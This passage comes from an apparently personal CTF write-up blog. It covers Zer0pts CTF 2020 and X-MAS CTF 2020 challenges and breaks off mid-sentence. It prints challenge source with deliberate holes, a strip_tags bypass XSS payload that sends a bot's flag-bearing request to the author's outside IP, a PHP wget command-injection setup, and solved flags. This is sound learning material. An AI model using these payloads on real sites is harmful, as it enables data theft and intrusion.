class="string">&quot;GET <span class="subst">#&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">before <span class="keyword">do</span></span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, <span class="string">&quot;flag&quot;</span>, File.read(<span class="string">&quot;flag.txt&quot;</span>).strip)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> params.has_key?(<span class="symbol">:q</span>) <span class="keyword">then</span></span><br><span class="line">    q = params[<span class="symbol">:q</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (q =~ <span class="regexp">/^[0-9a-f]&#123;16&#125;$/</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    sock = connect()</span><br><span class="line">    url = get(sock, q)</span><br><span class="line">    redirect url</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  send_file <span class="string">&#x27;index.html&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> params.has_key?(<span class="symbol">:url</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  url = params[<span class="symbol">:url</span>]</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> (url =~ URI.regexp) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  key = Random.urandom(<span class="number">8</span>).unpack(<span class="string">&quot;H*&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, key, url)</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;<span class="subst">#&#123;request.host&#125;</span>:<span class="subst">#&#123;request.port&#125;</span>/?q=<span class="subst">#&#123;key&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>취약점은 set 함수를 호출해서 url 값을 value로 이용해서 하나의 데이터를 생성하고 있습니다. 하지만 url 파라미터의 개행문제에 대한 필터링이 존재하지 않아 redis eval 명령어를 이용해서 set, get 명령어를 사용할 수 있게됩니다.</p><p>그래서 value 값을 redis.call(‘get’,’flag’)를 이용해서 flag를 가져와서 value로 넣어주고, 해당 데이터의 키를 이용해서 접근하면 flag를 볼 수 있습니다. 하지만 익스 페이로드를 작성해서 넘겨주니 잘 되지 않았습니다.</p><p>다시 풀어 더 정확한 풀이를 남기겠습니다.</p><hr><h2 id="Web-MusicBlog-653pts"><a href="#Web-MusicBlog-653pts" class="headerlink" title="(Web) MusicBlog [653pts]"></a>(Web) MusicBlog [653pts]</h2><p>MusicBlog 문제는 딱히 취약점 분류를 하기는 힘들고, 그냥 웹 서비스 로직 결함을 이용해 공격하는 문제입니다. 일단 소스 코드가 많아 로직이 어떤 식으로 돌아가는 지부터 확인을 해보겠습니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/MusicBlog/1.png?raw=true"><br><br>회원 가입을 하고, 로그인을 하면 Post를 작성하는 기능과 Post를 보는 기능이 존재합니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/MusicBlog/2.png?raw=true"><br>Post를 작성해주니 이상한 점은 <code>좋아요</code>를 눌러주지 않았는데 <code>좋아요</code>가 하나 찍힌 것을 볼 수 있다. 아마 Post가 새로 생성이 되면 좋아요가 자동으로 찍히는 로직이 있는 거 같습니다. 더 자세한 내용을 확인하기 위해서 코드를 분석해보겠습니다.</p><p><span style="color:#631F9C">&#62;</span> post.php</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;mt-4&quot;</span>&gt;</span></span><br><span class="line">            &lt;?php if ($post[&#x27;published&#x27;] === &#x27;0&#x27;) &#123; ?&gt;<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-secondary&quot;</span>&gt;</span>Secret<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&lt;?php &#125; ?&gt;</span><br><span class="line">            &lt;?= $post[&#x27;title&#x27;] ?&gt;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span>&gt;</span>by &lt;?= $post[&#x27;username&#x27;] ?&gt; <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-love badge-pill&quot;</span>&gt;</span>♥ &lt;?= $post[&#x27;likes&#x27;] ?&gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">            &lt;?= render_tags($post[&#x27;content&#x27;]) ?&gt;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;like.php?id=&lt;?= $post[&#x27;id&#x27;] ?&gt;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;like&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-love&quot;</span>&gt;</span>♥ Like this post<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>post.php를 보면 content의 값을 render_tags() 함수를 이용해서 검증을 하고 출력하는 것을 볼 수 있습니다.</p><p><span style="color:#631F9C">&#62;</span> util.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="comment">// [[URL]] → &lt;audio src=&quot;URL&quot;&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$str</span> = preg_replace(<span class="string">&#x27;/\[\[(.+?)\]\]/&#x27;</span>, <span class="string">&#x27;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  <span class="variable">$str</span> = strip_tags(<span class="variable">$str</span>, <span class="string">&#x27;&lt;audio&gt;&#x27;</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>util.php를 보면 render_tags() 함수가 존재합니다. preg_replace() 함수를 이용해서 &#91;&#91;ULR&#93;&#93;이라는 값이 들어오면 &lt;audio&gt;로 변환시켜주고, strip_tags() 함수를 이용해서 audio 태그만 허용하고 있는 것을 볼 수 있습니다. 하지만 strip_tags() 함수에서 취약점이 존재합니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/MusicBlog/3.png?raw=true"><br>위 사진을 보면 <code>&lt;a/udio&gt;</code>라는 문자열이 들어와도 <code>&lt;audio&gt;</code>로 인식을 하는 것을 볼 수 있습니다. 중간에 슬래쉬가 들어와도 동일하게 인식을 합니다. 이를 이용해서 오디오 태그 외에 a 태그도 사용을 할 수 있다는 것을 알 수 있습니다.</p><p><span style="color:#631F9C">&#62;</span> worker.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">&#x27;networkidle0&#x27;</span>,</span><br><span class="line">            timeout: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        page.click(<span class="string">&#x27;#like&#x27;</span>);</span><br><span class="line">        <span class="keyword">await</span> page.waitForNavigation(&#123;<span class="attr">timeout</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>아까 Post를 생성하면 <code>좋아요</code>가 하나 찍히는 것을 확인했습니다. 그래서 해당 로직을 찾아보니 wocker.js에 crawl로 정의를 하는 것을 볼 수 있었습니다.  위 코드는 Post가 생성이 되면 <code>User-Agent</code>의 값으로 <code>FLAG</code>를 넣고, id 값이 like인 버튼을 클릭해서 <code>좋아요</code>를 눌러주는 것을 볼 수 있습니다.</p><p><span style="color:#631F9C">&#62;</span> init.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; script-src &#x27;nonce-$&#123;nonce&#125;&#x27; &#x27;strict-dynamic&#x27;; base-uri &#x27;none&#x27;; trusted-types&quot;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-XSS-Protection: 1; mode=block&#x27;</span>);</span><br></pre></td></tr></table></figure><p>그래서 XSS를 이용해서 User-Agent 값을 가져와야 하나 생각을 했지만 위와 같이 CSP가 걸려 있어 불가능해보였습니다,, 하지만 아까 util.php의 render_tags() 함수에서 strip_tags() 함수를 사용해서 태그를 검증하고 있었는데 이때 함수를 우회해서 a 태그를 사용할 수 있었습니다.</p><p>그럼 content의 값으로 “&#60;a id=’like’ href=’myip’&#62;&#60;/a&#62;”를 주면 click(‘#like’)에 의해서 User-Agent에 FLAG가 들어있는 상태로 myip로 요청이 갈 것 입니다.</p><p><span style="color:#631F9C">&#62;</span> Exploit</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/MusicBlog/4.png?raw=true"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/udio id=&quot;like&quot; href=&quot;http://141.164.52.207:12345&quot;&gt;GG<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>그래서 위 페이로드를 <code>Content</code>의 값으로 넘겨주니 요청이 내 서버로 전송이 된 것을 확인할 수 있었고, User-Agent 헤더의 flag가 있는 것도 볼 수 있었습니다.</p><blockquote><p>FLAG : zer0pts{M4sh1m4fr3sh!!}</p></blockquote><hr><h3 id="Web-phpNantoKaAdmin-755pts"><a href="#Web-phpNantoKaAdmin-755pts" class="headerlink" title="(Web) phpNantoKaAdmin [755pts]"></a>(Web) phpNantoKaAdmin [755pts]</h3><p>귀찮다.</p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> Python Pickle RCE </tag>
            
            <tag> REDIS </tag>
            
            <tag> Client Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X-MAS CTF 2020 Write Up</title>
      <link href="2020/12/19/2020-12-19-X-MAS-CTF-2020/"/>
      <url>2020/12/19/2020-12-19-X-MAS-CTF-2020/</url>
      
        <content type="html"><![CDATA[<p>This is the first X-MAS CTF to start studying web security and it was much more fun than I thought. Let’s write a Write Up of interesting problems while solving problems in this CTF.</p><p>This time, I participated in CTF by collaborating with <span style="color:blue"><code>Einstrasse</code></span>. If you want to see eine’s Write Up, you can go <a href="https://eine.tistory.com/entry/Xmas-CTF-2020-write-ups-focus-on-web-challs?category=826774">here</a>!</p><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/main.png?raw=true"></p><hr><h2 id="Programming-Least-Greatest-50-pts"><a href="#Programming-Least-Greatest-50-pts" class="headerlink" title=" (Programming) Least Greatest [50 pts]"></a><span style="color:#21C587"></span> (Programming) Least Greatest [50 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Least%20Greatest/1.png?raw=true"><br>This time, we will solve the programming problems from X-MAS CTF 2020. The problem was solved easily because <code>eine</code> analyzed the algorithm.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Least%20Greatest/2.png?raw=true"><br>If you connect with nc, you can see that gcd, lcm numbers are given. Here, the number of factors obtained by decomposing the lcm/gcd value by 2^N is given to the next step.</p><p>It is said that you can do this a total of 100 times, but the time should be within 90 seconds. So I just used Python to write the code and return it.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;challs.xmas.htsp.ro&quot;</span>, <span class="number">6050</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;1/100\n&quot;</span>).strip().split()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span>(<span class="params">_count</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(_count):</span><br><span class="line">        num = r.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&quot;= &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        num1 = r.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&quot;= &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        print(<span class="string">&quot;gcd(x, y) : &quot;</span> + num)</span><br><span class="line">        print(<span class="string">&quot;lcm(x, y) : &quot;</span> + num1)</span><br><span class="line">        s_num = <span class="built_in">int</span>(<span class="built_in">int</span>(num1)//<span class="built_in">int</span>(num))</span><br><span class="line">        cmd = <span class="string">&quot;yafu-x64 factor(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(s_num)</span><br><span class="line">        out = subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">        check = out.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        length = check.count(<span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">            data.append(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">            data[j] = check.split(<span class="string">&#x27;P&#x27;</span>)[i].split(<span class="string">&quot; =&quot;</span>)[<span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;ans&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        b = []</span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                b.append(data[i])</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>+k,<span class="built_in">len</span>(b)):</span><br><span class="line">                    <span class="keyword">if</span> b[j] != data[i]:</span><br><span class="line">                        b.append(data[i])</span><br><span class="line">                        k += <span class="number">1</span>           </span><br><span class="line">        Count = <span class="built_in">len</span>(b)</span><br><span class="line">        count = <span class="number">2</span>**Count</span><br><span class="line">        print(<span class="string">&quot;Round : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(a+<span class="number">1</span>))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(count))</span><br><span class="line">        print(r.recvline())</span><br><span class="line">        r.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    go(<span class="number">100</span>)</span><br><span class="line">    print(r.recv())</span><br></pre></td></tr></table></figure><p>I wrote the exploit code as above.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Least%20Greatest/3.png?raw=true"><br>When I returned the exploit code, I could see the flag appear.</p><blockquote><p>FLAG : X-MAS{gr347es7_c0mm0n_d1v1s0r_4nd_l345t_c0mmon_mult1pl3_4r3_1n73rc0nn3ct3d}</p></blockquote><hr><h2 id="Web-PHP-Master-33-pts"><a href="#Web-PHP-Master-33-pts" class="headerlink" title=" (Web) PHP Master [33 pts]"></a><span style="color:#21C587"></span> (Web) PHP Master [33 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.00.png?raw=true"></p><p>Solve URL : <code>http://challs.xmas.htsp.ro:3000/?param1=1.0&amp;param2=001</code><br></p><blockquote><p>FLAG : X-MAS{s0_php_m4ny_skillz-69acb43810ed4c42}</p></blockquote><hr><h2 id="Web-flag-checker-59-pts"><a href="#Web-flag-checker-59-pts" class="headerlink" title=" (Web) flag_checker [59 pts]"></a><span style="color:#21C587"></span> (Web) flag_checker [59 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/flag_checker/1.png?raw=truehttps://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/flag_checker/1.png?raw=true"><br>This time, we will solve a problem called <code>flag_checker</code> among web problems in X-MAS CTF 2020.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* flag_checker */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$example_flag</span> = strtolower(<span class="string">&#x27;FAKE-X-MAS&#123;d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789&#125;&#x27;</span>);</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$flag</span>) &amp;&amp; <span class="variable">$valid</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$example_flag</span>, strtolower(<span class="variable">$flag</span>[<span class="variable">$i</span>])) === <span class="literal">false</span>) <span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$valid</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&quot;wget -q -O - https://kuhi.to/flag/&quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$cmd_output</span> = <span class="keyword">array</span>();</span><br><span class="line">    exec(<span class="variable">$command</span>, <span class="variable">$cmd_output</span>);</span><br><span class="line">    <span class="keyword">if</span>(count(<span class="variable">$cmd_output</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Nope&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Maybe&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!checkFlag(<span class="variable">$flag</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;That is not a correct flag!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getFlag(<span class="variable">$flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>When it comes to problems, the above PHP source code exists.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$example_flag</span> = strtolower(<span class="string">&#x27;FAKE-X-MAS&#123;d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789&#125;&#x27;</span>);</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$flag</span>) &amp;&amp; <span class="variable">$valid</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$example_flag</span>, strtolower(<span class="variable">$flag</span>[<span class="variable">$i</span>])) === <span class="literal">false</span>) <span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$valid</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Looking at the checkFlag function, it puts a fake flag in a variable called example_flag, and checks whether the character in $flag is in example_flag.</p><p>If any of the values of $flag are not included in example_flag, False is returned.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&quot;wget -q -O - https://kuhi.to/flag/&quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$cmd_output</span> = <span class="keyword">array</span>();</span><br><span class="line">    exec(<span class="variable">$command</span>, <span class="variable">$cmd_output</span>);</span><br><span class="line">    <span class="keyword">if</span>(count(<span class="variable">$cmd_output</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Nope&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Maybe&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The getFlag function receives the $flag value, connects it after the wget command, and sets the output of the exec function as an array.</p><p>Here, if the command executed well, it prints Maybe, and if not, prints Nope.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!checkFlag(<span class="variable">$flag</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;That is not a correct flag!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getFlag(<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure><p>In the above part, you can see that the flag value is received, the input value is verified using the checkFlag function, and the getFlag function is executed if the filtering does not occur.</p><p>In this problem, the command execution value is not output, so the input value must be retrieved to a private server.</p><p>So, first, let’s check if there is a way to get the php file using the wget command.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/flag_checker/2.png?raw=true"><br>When I searched Google for 